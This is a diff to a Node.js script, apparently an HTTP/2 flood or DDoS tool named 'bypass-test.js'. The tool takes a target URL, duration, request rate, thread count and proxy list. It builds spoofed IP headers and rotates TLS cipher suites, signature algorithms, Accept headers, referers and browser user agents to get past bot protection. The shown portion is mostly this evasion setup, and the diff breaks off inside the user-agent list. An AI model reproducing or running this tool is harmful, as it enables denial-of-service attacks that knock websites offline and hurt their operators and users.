@@ -1,678 +1,397 @@
-const net = require('net');
-const tls = require('tls');
-const HPACK = require('hpack');
-const cluster = require('cluster');
-const fs = require('fs');
-const os = require('os');
-const crypto = require('crypto');
-const { setsockopt } = require('sockopt');
+const net = require("net");
+ const http2 = require("http2");
+ const tls = require("tls");
+ const cluster = require("cluster");
+ const url = require("url");
+ const crypto = require("crypto");
+ const fs = require("fs");
+ const axios = require('axios');
+ const cheerio = require('cheerio'); 
+ const gradient = require("gradient-string")
 
-const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
-const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
+ process.setMaxListeners(0);
+ require("events").EventEmitter.defaultMaxListeners = 0;
+ process.on('uncaughtException', function (exception) {
+  });
 
-require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+ if (process.argv.length < 7){console.log(gradient.vice(`Usage：\nnode bypass-test.js <target> <time> <rate> <thread> <proxyFile>`));; process.exit();}
+ const headers = {};
+  function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
+ 
+ function randomIntn(min, max) {
+     return Math.floor(Math.random() * (max - min) + min);
+ }
+ 
+ function randomElement(elements) {
+     return elements[randomIntn(0, elements.length)];
+ } 
+ 
+ function randstr(length) {
+   const characters =
+     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+   let result = "";
+   const charactersLength = characters.length;
+   for (let i = 0; i < length; i++) {
+     result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+ }
+ 
+ const ip_spoof = () => {
+   const getRandomByte = () => {
+     return Math.floor(Math.random() * 255);
+   };
+   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
+ };
+ 
+ const spoofed = ip_spoof();
+ 
+ const args = {
+     target: process.argv[2],
+     time: parseInt(process.argv[3]),
+     Rate: parseInt(process.argv[4]),
+     threads: parseInt(process.argv[5]),
+     proxyFile: process.argv[6]
+ }
+ const sig = [    
+    "ecdsa_secp256r1_sha256",
+    "ecdsa_secp384r1_sha384",
+    "ecdsa_secp521r1_sha512",
+    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+    'ecdsa_brainpoolP256r1tls13_sha256',
+    'ecdsa_brainpoolP384r1tls13_sha384',
+    'ecdsa_brainpoolP512r1tls13_sha512',
+    'ecdsa_sha1',
+    'ed25519',
+    'ed448',
+    'ecdsa_sha224',
+    'rsa_pkcs1_sha1',
+    'rsa_pss_pss_sha256',
+    'dsa_sha256',
+    'dsa_sha384',
+    'dsa_sha512',
+    'dsa_sha224',
+    'dsa_sha1',
+    'rsa_pss_pss_sha384',
+    'rsa_pkcs1_sha2240',
+    'rsa_pss_pss_sha512',
+    'sm2sig_sm3',
+    'ecdsa_secp521r1_sha512',
+    "rsa_pss_rsae_sha256",
+    "rsa_pss_rsae_sha384",
+    "rsa_pss_rsae_sha512",
+    "rsa_pkcs1_sha256",
+    "rsa_pkcs1_sha384",
+    "rsa_pkcs1_sha512",
+ ];
+ const sigalgs1 = sig.join(':');
+ const cplist = [
+    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+         "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 
-process
-    .setMaxListeners(0)
-    .on('uncaughtException', function (e) {
-        console.log(e)
-        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
-    })
-    .on('unhandledRejection', function (e) {
-        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
-    })
-    .on('warning', e => {
-        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
-    })
-    .on("SIGHUP", () => {
-        return 1;
-    })
-    .on("SIGCHILD", () => {
-        return 1;
-    });
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
+  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 
-const statusesQ = []
-let statuses = {}
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 
-const blockedDomain = [".gov", ".edu"];
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
+  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 
-const timestamp = Date.now();
-const timestampString = timestamp.toString().substring(0, 10);
-const currentDate = new Date();
-const targetDate = new Date('2024-02-30');
+ 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+ ];
+ const accept_header = [
+ "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
+ ]; 
+ const lang_header = ["en-US,en;q=0.9"];
+ 
+ const encoding_header = ["gzip, deflate, br"];
+ 
+ const control_header = ["no-cache", "max-age=0"];
+ 
+ const refers = [
+     "https://www.google.com/",
+     "https://www.facebook.com/",
+     "https://www.twitter.com/",
+     "https://www.youtube.com/",
+     "https://www.linkedin.com/",
+     "https://www.amazon.com/",
+     "https://www.github.com",
+     "https://www.microsoft.com",
+ ];
+ const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+ const ciphers1 = "GREASE:" + [
+     defaultCiphers[2],
+     defaultCiphers[1],
+     defaultCiphers[0],
+     ...defaultCiphers.slice(3)
+ ].join(":");
+ 
+ const uap = [
+     "Mozilla/5.0 (Linux; Android 8.0.0; HWI-AL00 Build/HUAWEIHWI-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.17 SP-engine/2.13.0 baiduboxapp/11.17.0.13 (Baidu; P1 8.0.0)",
+     "Mozilla/5.0 (Linux; Android 9; GLK-AL00 Build/HUAWEIGLK-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.17 SP-engine/2.13.0 baiduboxapp/11.17.0.13 (Baidu; P1 9) NABar/2.0",
+     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
+     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4033.2 Safari/537.36 Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; BLA-AL00 Build/HUAWEIBLA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.9 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; U; Android 10; zh-cn; LYA-TL00 Build/HUAWEILYA-TL00L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/10.1 Mobile Safari/537.36",
